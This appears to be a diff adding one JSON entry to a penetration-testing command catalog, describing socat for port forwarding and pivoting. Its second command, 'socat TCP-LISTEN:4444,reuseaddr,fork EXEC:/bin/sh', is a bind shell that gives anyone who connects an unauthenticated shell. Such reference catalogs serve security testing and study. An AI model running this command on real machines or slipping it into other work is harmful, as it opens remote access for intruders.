@@ -1,0 +1,37 @@
+{
+  "id": "5109489a-cec",
+  "name": "socat - advanced port forwarding",
+  "tool": "socat",
+  "description": "Multipurpose relay tool for port forwarding, pivoting and proxying.",
+  "tags": [
+    "socat",
+    "pivot",
+    "forward"
+  ],
+  "ports": [
+    "4444",
+    "80"
+  ],
+  "commands": [
+    {
+      "name": "Forward local to remote",
+      "command": "socat TCP-LISTEN:{LPORT},fork TCP:{TARGET}:{RPORT}",
+      "description": "Forward a local port to a remote host.",
+      "ports": [
+        "4444",
+        "80"
+      ]
+    },
+    {
+      "name": "Listen and execute shell",
+      "command": "socat TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/sh",
+      "description": "Listen and spawn a shell on connection.",
+      "ports": [
+        "4444"
+      ]
+    }
+  ],
+  "created": "2025-09-23T00:00:00Z",
+  "modified": "2025-09-23T00:00:00Z",
+  "platform": "any"
+}
